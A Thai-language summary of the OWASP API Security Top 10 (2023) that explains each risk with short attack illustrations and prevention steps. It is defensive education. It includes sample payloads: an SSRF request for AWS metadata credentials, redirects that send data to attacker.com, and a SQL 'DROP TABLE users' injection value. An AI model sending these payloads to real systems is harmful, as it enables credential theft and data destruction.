# OWASP API Security Top 10 — 2023
### ความเสี่ยงด้านความปลอดภัย 10 อันดับแรกของ API

> **แหล่งที่มา:** https://owasp.org/API-Security/editions/2023/en/
> **ฉบับ:** เวอร์ชันเสถียร 2023 (เผยแพร่ 5 มิถุนายน 2566)
> **License:** Creative Commons Attribution-ShareAlike 4.0

---

## ทำไม API Security จึงสำคัญ?

**API (Application Programming Interface)** คือส่วนประกอบหลักของนวัตกรรมยุคใหม่ ตั้งแต่ธนาคาร, ค้าปลีก, ขนส่ง ไปจนถึง IoT, ยานยนต์ไร้คนขับ และ smart city — API เป็นส่วนสำคัญของแอปพลิเคชัน mobile, SaaS และ web ทั้งที่เผชิญกับลูกค้า, พันธมิตร และการใช้งานภายในองค์กร

โดยธรรมชาติแล้ว API เปิดเผย logic ของแอปพลิเคชันและข้อมูลสำคัญ เช่น PII (Personally Identifiable Information) ทำให้กลายเป็นเป้าหมายที่ผู้โจมตีมุ่งสนใจมากขึ้นเรื่อยๆ

ในปี 2023 traffic ของ API คิดเป็น **58% ของ dynamic traffic ทั้งหมด** ในอินเทอร์เน็ต เพิ่มขึ้นจาก 54% ในปลายปี 2564 (2021)

---

## เกี่ยวกับ OWASP API Security Top 10:2023

เอกสารฉบับนี้คือ **ฉบับที่สอง** ของ OWASP API Security Top 10 โดยเวอร์ชันแรกเผยแพร่ในปี 2562 (2019) การอัปเดตครั้งนี้สะท้อนให้เห็นถึงพัฒนาการของอุตสาหกรรม API Security ในช่วง 4 ปีที่ผ่านมา ซึ่งรวมถึงเทรนด์ใหม่ที่เกิดขึ้น, เทคนิคการโจมตีที่พัฒนาขึ้น และมุมมองจากผู้เชี่ยวชาญในหลากหลายอุตสาหกรรม

**เป้าหมายหลัก:** ให้ความรู้แก่ผู้ที่เกี่ยวข้องกับการพัฒนาและดูแล API ได้แก่ developer, designer, architect, manager และองค์กร

**ข้อสรุปสำคัญจากฉบับ 2023:** Authorization ยังคงเป็นความท้าทายที่ใหญ่ที่สุดใน API Security โดย **3 ใน 5 อันดับแรก** เกี่ยวข้องกับ authorization (access control) โดยตรง

---

## ภาพรวม Top 10:2023

| อันดับ | รหัส | ชื่อความเสี่ยง | สถานะเทียบปี 2019 |
|:---:|---|---|---|
| 1 | API1 | Broken Object Level Authorization (BOLA) | ↔ คงอันดับ |
| 2 | API2 | Broken Authentication | ↔ คงอันดับ (เปลี่ยนชื่อ) |
| 3 | API3 | Broken Object Property Level Authorization | 🆕 รวม API3:2019 + API6:2019 |
| 4 | API4 | Unrestricted Resource Consumption | ↔ คงอันดับ (เปลี่ยนชื่อ) |
| 5 | API5 | Broken Function Level Authorization | ↔ คงอันดับ |
| 6 | API6 | Unrestricted Access to Sensitive Business Flows | 🆕 หมวดใหม่ |
| 7 | API7 | Server Side Request Forgery (SSRF) | 🆕 หมวดใหม่ |
| 8 | API8 | Security Misconfiguration | ↓ ลงจากอันดับ 7 |
| 9 | API9 | Improper Inventory Management | ↔ คงอันดับ (เปลี่ยนชื่อ) |
| 10 | API10 | Unsafe Consumption of APIs | 🆕 หมวดใหม่ |

---

## รายละเอียดแต่ละความเสี่ยง

---

### 🔴 API1:2023 — Broken Object Level Authorization (BOLA)

**ยืนอันดับ 1 ต่อเนื่องจากปี 2019 — ความเสี่ยงที่แพร่หลายที่สุดใน API**

**Object Level Authorization** คือกลไกการควบคุมการเข้าถึงที่ implement ไว้ในระดับ code เพื่อให้แน่ใจว่าผู้ใช้เข้าถึงได้เฉพาะ object ที่ตนมีสิทธิ์เท่านั้น

**หลักการ:** ทุก API endpoint ที่รับ ID ของ object และดำเนินการใดๆ กับ object นั้น จะต้อง implement การตรวจสอบ object-level authorization อย่างสม่ำเสมอ

**ลักษณะช่องโหว่:**
- API ไม่ตรวจสอบว่าผู้ใช้ที่ล็อกอินอยู่มีสิทธิ์เข้าถึง object ที่ระบุ ID มาหรือไม่
- ผู้โจมตีเพียงแค่แก้ไข ID ใน API request เช่น เปลี่ยน `GET /api/orders/1001` เป็น `GET /api/orders/1002` ก็สามารถเข้าถึงคำสั่งซื้อของผู้ใช้คนอื่นได้
- ช่องโหว่นี้พบใน **~40% ของ API attack** ทั้งหมด และตรวจจับได้ยากด้วย automated tool
- อาจนำไปสู่ full account takeover หากผู้โจมตีสามารถจัดการ password reset flow ได้

**ตัวอย่างการโจมตี:**
```
# ผู้โจมตีล็อกอินด้วยบัญชีตัวเอง แล้วลองเข้าถึงข้อมูลคนอื่น
GET /api/v1/users/123/profile  <- ID ของผู้โจมตีเอง
GET /api/v1/users/124/profile  <- ID ของผู้ใช้คนอื่น (ไม่ควรเข้าถึงได้!)
```

**แนวทางป้องกัน:**
- ใช้กลไก authorization ที่พึ่งพา user policy และ hierarchy เพื่อตรวจสอบว่าผู้ใช้ที่ล็อกอินอยู่มีสิทธิ์เข้าถึง object ที่ร้องขอจริงหรือไม่
- ใช้ค่า ID ที่ไม่สามารถคาดเดาได้ (random GUID) แทน sequential integer
- เขียน test เพื่อประเมิน authorization mechanism และไม่ deploy เมื่อ test ล้มเหลว
- ตรวจสอบ authorization ในทุก endpoint และทุก session อย่างต่อเนื่อง

---

### 🔴 API2:2023 — Broken Authentication

**ยังคงเป็นหนึ่งในความเสี่ยงสูงสุด — ครอบคลุมความล้มเหลวของ authentication ทุกรูปแบบ**

กลไก authentication มักถูก implement ผิดพลาด ทำให้ผู้โจมตีสามารถ compromise authentication token หรือใช้ประโยชน์จากข้อบกพร่องในการ implement เพื่อปลอมตัวเป็นผู้ใช้คนอื่นได้ทั้งชั่วคราวหรือถาวร

**สำคัญมาก:** OAuth ไม่ใช่ authentication และ API key ก็ไม่ใช่เช่นกัน

**ลักษณะช่องโหว่:**
- ไม่มี rate limiting บน login — เปิดช่องให้ brute-force, credential stuffing, dictionary attack
- อนุญาตให้ใช้ weak password หรือ default credential ที่รู้จักกันทั่วไป
- JWT token ที่ไม่ได้ validate อย่างถูกต้อง เช่น ไม่ตรวจสอบ signature หรือ expiry
- การส่ง sensitive authentication detail ผ่าน URL (เช่น token ใน query string)
- ไม่มี MFA สำหรับ operation ที่มีความเสี่ยงสูง
- endpoint สำหรับ reset password, register หรือ social login ไม่ได้รับการ secure เช่นเดียวกับ login endpoint หลัก

**ตัวอย่างการโจมตี:**
```
# ผู้โจมตีสามารถ update email โดยไม่ต้องยืนยัน password ปัจจุบัน
PUT /account
Authorization: Bearer <stolen_token>
{"email": "attacker@evil.com"}
# จากนั้นเริ่ม password reset flow -> เข้าถึงบัญชีได้สมบูรณ์
```

**แนวทางป้องกัน:**
- ศึกษา authentication flow ทั้งหมดที่มี (mobile, web, deep link, one-click authentication ฯลฯ) อย่าปล่อยให้ขาดการ secure
- Implement anti-brute-force mechanism ที่เข้มงวดกว่า rate limiting ทั่วไปบน authentication endpoint
- Implement weak-password check ป้องกันไม่ให้ใช้ password ที่ถูก compromise แล้ว
- ใช้ multi-factor authentication (MFA)
- อย่า reinvent the wheel — ใช้ library ที่ได้รับการพิสูจน์แล้วสำหรับ authentication, token generation และ password storage
- API key ควรใช้เฉพาะสำหรับ API client authentication เท่านั้น ไม่ใช่ user authentication

---

### 🔴 API3:2023 — Broken Object Property Level Authorization (BOPLA)

**🆕 หมวดใหม่ที่รวม API3:2019 (Excessive Data Exposure) และ API6:2019 (Mass Assignment)**

หมวดนี้มุ่งไปที่ **สาเหตุต้นตอ** ร่วมกันของช่องโหว่เดิมสองตัว: การขาดหรือไม่มีการ validate authorization ในระดับ property ของ object ซึ่งนำไปสู่ทั้งการเปิดเผยข้อมูลและการดัดแปลงข้อมูลโดยไม่ได้รับอนุญาต

**สองรูปแบบของความเสี่ยง:**

**รูปแบบที่ 1 — Excessive Data Exposure:** API คืนข้อมูลมากเกินความจำเป็น แล้วให้ client กรองเอง
```json
// ร้องขอแค่ชื่อผู้ใช้ แต่ API ส่งคืน field ที่ไม่ควรเปิดเผย:
{
  "username": "alice",
  "email": "alice@example.com",
  "role": "admin",
  "password_hash": "...",
  "internal_id": "..."
}
```

**รูปแบบที่ 2 — Mass Assignment:** API รับ property ทั้งหมดจาก request body โดยไม่กรอง ทำให้ผู้โจมตีแก้ไข field ที่ไม่ควรได้รับอนุญาต
```json
// ผู้ใช้ส่ง request อัปเดต profile แต่แอบใส่ field สำคัญ
PUT /api/users/me
{
  "name": "Alice",
  "role": "admin"
}
```

**แนวทางป้องกัน:**
- ไม่ใช้ฟังก์ชัน serialize อัตโนมัติในการส่งข้อมูลกลับ client — เลือกเฉพาะ field ที่ต้องการคืน
- ตั้งค่า property ที่ client ควรอัปเดตได้เป็น allowlist และตรวจสอบ sensitivity ของแต่ละ property
- ใช้ schema-based validation (เช่น DTO) แยกตาม operation (read/write/update)
- ตรวจสอบ response ของ API อย่างสม่ำเสมอเพื่อให้แน่ใจว่าส่งคืนเฉพาะข้อมูลที่จำเป็นจริงๆ

---

### 🟠 API4:2023 — Unrestricted Resource Consumption

**เดิมชื่อ "Lack of Resources & Rate Limiting" — เน้นที่ root cause มากขึ้น**

การตอบสนอง API request ต้องใช้ทรัพยากร ได้แก่ network bandwidth, CPU, memory และ storage นอกจากนี้ ทรัพยากรบางอย่างเช่น SMS, phone call หรือ biometrics validation มีค่าใช้จ่ายต่อ request — การโจมตีที่ประสบความสำเร็จนำไปสู่ทั้ง Denial of Service (DoS) และค่าใช้จ่ายที่เพิ่มขึ้นโดยไม่คาดคิด

**API มีความเสี่ยงเมื่อขาด limit เหล่านี้:**
- สูงสุดของ execution timeout
- สูงสุดของ memory ที่ allocate ได้
- จำนวน file descriptor สูงสุด
- จำนวน process สูงสุด
- ขนาดสูงสุดของ request payload (เช่น upload)
- จำนวน request ต่อ client ต่อ resource
- จำนวน record ต่อ page สำหรับ response
- การจำกัดค่าใช้จ่ายของการเรียก third-party service ต่อ client

**ตัวอย่างการโจมตี:**
```
# ผู้โจมตีแก้ไข page size เพื่อให้ server ใช้ทรัพยากรมากเกินไป
GET /api/products?page=1&page_size=999999

# โจมตี SMS OTP เพื่อสร้างค่าใช้จ่ายโดยไม่มี limit
POST /auth/forgot-password {"phone": "+1-234-567-8900"}
# ส่งซ้ำหลายพันครั้ง -> ค่า SMS พุ่งสูง
```

**แนวทางป้องกัน:**
- กำหนด rate limit และ throttle บนทุก API โดยเฉพาะบน memory, CPU, restarts และ file descriptor
- ตั้ง limit สำหรับ payload ขาเข้า รวมถึงขนาดสูงสุดของ string, array และ object
- กำหนด rate limit สำหรับการเรียกใช้ third-party API ต่อ client พร้อม alert
- ใช้ rate limit ที่เข้มงวดกว่าปกติสำหรับ authentication endpoint
- Monitor resource usage และ alert เมื่อมีการใช้ผิดปกติ

---

### 🟠 API5:2023 — Broken Function Level Authorization (BFLA)

**ความเสี่ยงที่แยบยล — เกี่ยวกับการเข้าถึง function ที่ไม่มีสิทธิ์**

Policy ในการควบคุมการเข้าถึงที่ซับซ้อน ประกอบด้วย hierarchy, group และ role ที่หลากหลาย รวมกับการแบ่งแยกที่ไม่ชัดเจนระหว่าง admin function กับ regular function มักนำไปสู่ authorization flaw

**ความแตกต่างสำคัญระหว่าง BOLA (API1) และ BFLA (API5):**
- **BOLA:** ผู้ใช้มีสิทธิ์ใช้ endpoint แต่เข้าถึง object ที่ไม่ใช่ของตน (เช่น ดูคำสั่งซื้อคนอื่น)
- **BFLA:** ผู้ใช้ไม่มีสิทธิ์ใช้ endpoint นั้นเองตั้งแต่แรก (เช่น ลบ menu item ทั้งที่เป็นแค่ลูกค้า)

**ลักษณะช่องโหว่:**
- Administrative endpoint ที่ไม่ได้ป้องกัน ผู้ใช้ทั่วไปสามารถเข้าถึงได้
- HTTP method ที่แตกต่างกันมีระดับสิทธิ์ไม่ตรงกัน เช่น GET ป้องกันแล้วแต่ PUT ยังไม่ได้ป้องกัน
- ผู้ใช้สามารถปรับเปลี่ยน role หรือ privilege ของตัวเองในการร้องขอ

**ตัวอย่างการโจมตี:**
```
# ผู้ใช้ทั่วไปลองเรียก admin endpoint โดยตรง
DELETE /api/v1/menu/items/1234  -> ไม่มีการตรวจสอบ role -> สำเร็จ!

# หรือลองเปลี่ยน API version เพื่อ bypass การป้องกัน
GET /api/v2/admin/users
```

**แนวทางป้องกัน:**
- ใช้ default deny — ปิดทุก endpoint โดยค่าเริ่มต้น แล้วค่อยเปิดเฉพาะที่จำเป็น
- ตรวจสอบ authorization บน administrative function อย่างเป็นระบบ โดยอิงจาก user role และ permission
- ตรวจสอบให้แน่ใจว่า admin endpoint ไม่สามารถเข้าถึงได้จากภายนอก
- เขียน test เพื่อค้นหา authorization flaw และรวมไว้ใน CI/CD pipeline

---

### 🟠 API6:2023 — Unrestricted Access to Sensitive Business Flows

**🆕 หมวดใหม่ — ความเสี่ยงระดับ business logic ที่เกิดจากการ automate**

API ที่มีความเสี่ยงนี้เปิดเผย business flow ที่สำคัญ เช่น การซื้อบัตร, การโพสต์ความเห็น หรือการจองที่นั่ง โดยไม่มีการป้องกันเพียงพอเมื่อ function เหล่านั้นถูกใช้อย่างอัตโนมัติและมากเกินไป

**สำคัญ:** ช่องโหว่นี้ไม่ได้มาจาก bug ในการ implement แต่มาจากการขาดความเข้าใจว่า business flow จะถูกทำร้ายอย่างไรเมื่อถูกใช้ซ้ำแบบอัตโนมัติ

**ตัวอย่างที่ชัดเจน:**
- **ซื้อสินค้า limited edition:** ผู้โจมตีเขียน script ซื้อ gaming console รุ่นใหม่ทุกชิ้นในคลังทันทีที่วางขาย โดยกระจาย request จาก IP หลายตัวพร้อมกัน — ลูกค้าจริงซื้อไม่ได้เลย
- **การจองที่นั่ง:** bot จอง time slot ทั้งหมดของร้านหรือคลินิก ทำให้ลูกค้าจริงไม่สามารถจองได้
- **Referral abuse:** bot สร้างบัญชีจำนวนมากเพื่อใช้ referral bonus ซ้ำๆ

**แนวทางป้องกัน:**
- ระบุ business flow ที่สำคัญที่อาจสร้างความเสียหายหากถูกใช้มากเกินไป
- Implement กลไกตรวจจับ non-human behavior เช่น device fingerprinting, CAPTCHA, behavior analysis
- ประเมินว่าผู้ที่เข้าถึง flow ควรเป็น human หรือ machine และกำหนดการป้องกันให้ตรงกัน
- ทดสอบกลไกป้องกัน bot อย่างสม่ำเสมอ

---

### 🟡 API7:2023 — Server Side Request Forgery (SSRF)

**🆕 หมวดใหม่ — อันตรายเป็นพิเศษในสภาพแวดล้อม cloud และ microservice**

**SSRF** เกิดขึ้นเมื่อ API ดึงข้อมูลจาก remote resource โดยไม่ validate URI ที่ผู้ใช้ระบุ ทำให้ผู้โจมตีสามารถบังคับให้ application ส่ง request ไปยัง destination ที่ไม่คาดคิด แม้จะมี firewall หรือ VPN ป้องกันอยู่ก็ตาม

**ทำไมอันตรายใน cloud:** สถาปัตยกรรมที่ใช้ microservice มักมี internal endpoint จำนวนมาก ผู้โจมตีที่ประสบความสำเร็จสามารถ:
- เข้าถึง internal service ที่ไม่ได้เปิดต่อสาธารณะ
- ขโมย cloud credential จาก metadata service (เช่น `169.254.169.254` ของ AWS)
- สแกน internal network และ port
- Bypass firewall rule

**ตัวอย่างการโจมตี:**
```
# ผู้ใช้อัปโหลด profile image จาก URL ที่ระบุเอง
POST /api/profile/image
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role"}
# Server ดึงข้อมูลจาก AWS metadata service และส่ง IAM credential กลับมา!

# หรือ redirect attack: third-party ตอบกลับด้วย redirect ไปหา attacker
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/collect-data
# API ติดตาม redirect โดยไม่ตรวจสอบ -> ส่งข้อมูลของผู้ใช้ไปหา attacker
```

**แนวทางป้องกัน:**
- Validate URL ที่รับจากผู้ใช้กับ allowlist ของ domain, IP range, media type และ URL scheme ที่อนุญาต
- ปิด HTTP redirect เมื่อไม่จำเป็น
- แยก (isolate) กลไกที่ใช้ดึงข้อมูล remote resource ออกจาก network ส่วนอื่น
- บล็อก traffic ไปยัง internal IP address, localhost และ metadata endpoint
- ใช้ AWS IMDSv2 หรือ equivalent สำหรับ cloud metadata protection

---

### 🟡 API8:2023 — Security Misconfiguration

**ลงจากอันดับ 7 ใน 2019 — ยังคงแพร่หลายในทุกองค์กร**

API และระบบที่รองรับมักมี configuration ซับซ้อน ซึ่งถูกออกแบบมาเพื่อให้ปรับแต่ง API ได้มากขึ้น แต่ Software Engineer และ DevOps Engineer มักพลาด configuration สำคัญหรือไม่ปฏิบัติตาม security best practice ในการ configure ระบบ

**ลักษณะช่องโหว่ที่พบบ่อย:**
- ใช้ default setting ที่ไม่ปลอดภัย หรือ default credential ที่ไม่ได้เปลี่ยน
- HTTP method ที่ไม่จำเป็นถูกเปิดใช้ เช่น PUT, DELETE บน endpoint ที่ควรเป็น read-only
- CORS policy ที่ไม่ถูกต้อง อนุญาตให้ทุก origin เข้าถึงได้
- Error message แบบ verbose ที่เปิดเผยข้อมูลของ stack trace หรือ internal structure
- ไม่ใช้ TLS หรือใช้ TLS configuration ที่ล้าสมัย
- Debug endpoint ที่ถูกเปิดทิ้งไว้ใน production environment
- การตั้งค่า security header ที่ขาดหายไป (เช่น `Strict-Transport-Security`, `X-Content-Type-Options`)

**ตัวอย่างเหตุการณ์จริง:** T-Mobile API breach ในปี 2566 (2023) ผู้โจมตีเข้าถึงข้อมูลลูกค้า 37 ล้านคนผ่าน API ที่ misconfigure

**แนวทางป้องกัน:**
- สร้างกระบวนการ hardening ที่ทำซ้ำได้ในทุก environment (development, staging, production)
- ตรวจสอบ configuration ทั้งหมดของ API gateway, load balancer, cache และ service อย่างต่อเนื่อง
- ปิด HTTP method ทั้งหมดที่ไม่จำเป็นในแต่ละ endpoint
- ปิด debug feature ทั้งหมดใน production
- Implement automated security testing ของ configuration ใน CI/CD pipeline

---

### 🟡 API9:2023 — Improper Inventory Management

**เดิมชื่อ "Improper Assets Management" — ปัญหา shadow API และ API ที่ถูกลืม**

API มีแนวโน้มเปิดเผย endpoint มากกว่า web application แบบดั้งเดิม ทำให้ documentation ที่ถูกต้องและทันสมัยมีความสำคัญอย่างยิ่ง การจัดทำ inventory ของ host และ API version ที่ deploy อยู่ทั้งหมดก็มีความสำคัญเช่นกัน เพื่อป้องกันปัญหาจาก deprecated version และ exposed debug endpoint

**ลักษณะช่องโหว่:**
- ไม่รู้ว่า API version ไหน หรือ endpoint ไหนบ้างที่กำลัง production อยู่
- API version เก่าที่ไม่ได้ maintain แล้วยังคงทำงานอยู่โดยไม่ได้รับ security patch
- ไม่มี documentation หรือ documentation ล้าสมัย ไม่ตรงกับ implementation จริง
- third-party API ที่ integrate อยู่ไม่ได้รับการ track หรือ monitor อย่างเพียงพอ
- การเข้าถึง sensitive data ผ่าน old/unpatched API version ที่ยังเชื่อมกับ database เดิม

**ตัวอย่างการโจมตี:**
```
# ผู้โจมตีลอง enumerate API version เก่าที่อาจยังทำงานอยู่
GET /api/v1/users/admin/password  <- version เก่า ยังทำงานแต่ไม่ได้ดูแล
GET /api/v2/users/admin/password  <- version ปัจจุบัน fix แล้ว

# หรือค้นหา shadow API ที่ไม่มีใน documentation
GET /api/internal/debug/users     <- endpoint ที่นักพัฒนาลืมลบออก
```

**ตัวอย่างเหตุการณ์จริง:** GitHub Repository Secrets Spill ในปี 2567 (2024) ที่ API secret กว่า 13 ล้านรายการถูกเปิดเผยใน public repository เนื่องจากไม่มีการ track อย่างเป็นระบบ

**แนวทางป้องกัน:**
- จัดทำ inventory ที่ครอบคลุมสำหรับทุก API host รวมถึง environment ที่เป็น cloud, on-premise และ third-party integration
- ใช้ automated API discovery tool เพื่อค้นหา undocumented หรือ shadow API
- ระบุ third-party integration ทั้งหมด และประเมิน data flow และ security posture ของแต่ละตัว
- deprecated API version ต้องมีแผน migration และ decommission ที่ชัดเจน
- ไม่เปิดเผย API ที่ไม่มีใน production inventory ต่อ public

---

### 🟢 API10:2023 — Unsafe Consumption of APIs

**🆕 หมวดใหม่แทน "Insufficient Logging & Monitoring" — ปัญหา third-party trust**

Developer มักไว้ใจข้อมูลที่ได้รับจาก third-party API มากกว่า user input จึงมักใช้ security standard ที่อ่อนแอกว่า เช่น ใน input validation และ sanitization เพื่อ compromise API เป้าหมาย ผู้โจมตีมักโจมตี third-party service ที่ integrate อยู่แทนที่จะโจมตี API โดยตรง

**ลักษณะช่องโหว่:**
- ไม่ validate หรือ sanitize ข้อมูลที่ได้รับจาก third-party API ก่อนนำไปใช้หรือส่งต่อ
- ติดตาม redirect จาก third-party API แบบ blindly โดยไม่ตรวจสอบ destination
- ส่งข้อมูลสำคัญของผู้ใช้ผ่าน third-party API ที่ไม่ได้ใช้ TLS
- ไม่จำกัด resource ที่ third-party response สามารถใช้ได้

**ตัวอย่างการโจมตีแบบ chain:**
```
// ขั้นตอนที่ 1: API ใช้ third-party geocoding service validate address ของผู้ใช้
// ขั้นตอนที่ 2: ผู้โจมตีสร้างธุรกิจปลอมบน third-party พร้อม SQL payload
Business name: "'; DROP TABLE users;--"

// ขั้นตอนที่ 3: API ดึงข้อมูลจาก third-party แล้ว execute SQL โดยไม่ sanitize
// -> ฐานข้อมูลถูกทำลาย!

// หรือ redirect attack กับข้อมูล medical ของผู้ใช้:
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
// API ส่ง sensitive data ไปหา attacker โดยไม่รู้ตัว!
```

**แนวทางป้องกัน:**
- ประเมิน security posture ของ service provider ทุกรายก่อน integrate
- ให้ API interaction ทั้งหมดเกิดขึ้นผ่าน secure connection (TLS) เสมอ
- Validate และ sanitize ข้อมูลทุกอย่างที่รับจาก integrated API ก่อนนำมาใช้
- ไม่ติดตาม redirect จาก third-party แบบ blindly
- จำกัด resource ที่ response ของ third-party จะใช้ได้
- Monitor health และ security ของ third-party service อย่างต่อเนื่อง

---

## การเปรียบเทียบ OWASP API Top 10: 2019 กับ 2023

```
ปี 2019                                    ปี 2023
────────────────────────────────────────────────────────────────────
API1: Broken Object Level Auth       -> API1: Broken Object Level Auth     (คงอยู่)
API2: Broken User Authentication     -> API2: Broken Authentication         (เปลี่ยนชื่อ)
API3: Excessive Data Exposure        -|
                                      +-> API3: Broken Object Property Level Auth (รวมกัน)
API6: Mass Assignment                -|
API4: Lack of Resources & Rate Limit -> API4: Unrestricted Resource Consumption  (เปลี่ยนชื่อ)
API5: Broken Function Level Auth     -> API5: Broken Function Level Auth    (คงอยู่)
API7: Security Misconfiguration      -> API8: Security Misconfiguration     (ลงอันดับ)
API9: Improper Assets Management     -> API9: Improper Inventory Management (เปลี่ยนชื่อ)
API8: Injection                      -> ❌ นำออก (รวมอยู่ใน OWASP Web Top 10)
API10: Insufficient Logging          -> ❌ นำออก
                                 🆕 API6: Unrestricted Access to Sensitive Business Flows
                                 🆕 API7: Server Side Request Forgery (SSRF)
                                 🆕 API10: Unsafe Consumption of APIs
```

---

## แนวทางสำหรับ Developer

**ขั้นตอนในการเริ่มต้น:**

1. **เรียนรู้ความเสี่ยง** — ทำความเข้าใจ OWASP API Top 10 ทั้ง 10 หมวดพร้อมตัวอย่างจริง
2. **ออกแบบระบบ authorization ให้ถูกต้อง** — เนื่องจาก 3 ใน 5 อันดับแรกเกี่ยวกับ authorization โดยตรง
3. **ทำ Threat Modeling** — ระบุ sensitive business flow และ data flow ที่ต้องการป้องกัน
4. **Implement security testing อัตโนมัติ** — รวม SAST, DAST และ API-specific test ใน CI/CD
5. **ทำ API inventory ให้สมบูรณ์** — รู้ว่า API ทุกตัวอยู่ที่ไหน เวอร์ชันอะไร และใครเข้าถึงได้
6. **Monitor ตลอดเวลา** — ตั้ง alert สำหรับพฤติกรรมผิดปกติ

## แนวทางสำหรับ DevSecOps

**เพิ่มความปลอดภัยเข้าสู่ pipeline:**

- รวม API security test ใน CI/CD pipeline ทุก stage
- ทำ automated scanning หา misconfiguration ใน infrastructure
- ใช้ API gateway ที่มี built-in security control
- Implement centralized logging และ monitoring สำหรับ API traffic ทั้งหมด
- กำหนดนโยบายว่า API ใดที่สามารถ communicate กับ third-party service ได้บ้าง

---

## แหล่งข้อมูลเพิ่มเติม

- [OWASP API Security Top 10 ฉบับเต็ม 2023](https://owasp.org/API-Security/editions/2023/en/)
- [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [OWASP Web Top 10:2021](https://owasp.org/Top10/)
- [OWASP API Security Project (GitHub)](https://github.com/OWASP/API-Security)

---

*เอกสารนี้แปลและสรุปจาก OWASP API Security Top 10:2023 เผยแพร่โดย OWASP Foundation ภายใต้ Creative Commons Attribution-ShareAlike 4.0 License*